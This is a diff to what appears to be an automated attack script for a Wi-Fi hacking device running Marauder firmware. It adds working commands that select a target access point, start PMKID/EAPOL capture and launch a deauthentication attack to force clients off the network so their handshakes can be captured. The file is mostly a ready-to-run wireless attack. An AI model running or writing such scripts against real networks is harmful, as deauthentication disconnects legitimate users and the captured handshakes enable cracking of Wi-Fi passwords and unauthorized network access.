@@ -44,10 +44,18 @@ WIFI_RESULT
 # Brief pause — manually note the target AP index from scan results
 DELAY 3000
 
+# Select the target AP so the PMKID capture / deauth is directed at it.
+WIFI_CMD select -a {{AP_INDEX}}
+WIFI_WAIT 500
+
 # ── Phase 2: PMKID + Deauth (runs for CAPTURE_SEC seconds) ──────────────────
-# Marauder's sniffpmkid -d sends deauth frames to force EAPOL 4-way handshakes
-# while simultaneously capturing PMKID values from beacon frames.
+# Marauder's sniffpmkid captures PMKID/EAPOL from the selected AP.  The deauth
+# forces clients to re-authenticate, producing the 4-way handshake to capture.
+WIFI_CMD sniffpmkid
+WIFI_WAIT 1000
+WIFI_CMD attack -t deauth
 WIFI_WAIT {{CAPTURE_SEC}}000
+WIFI_STOP
 
 # ── Phase 3: Results Reporting ───────────────────────────────────────────────
 PLATFORM WIN
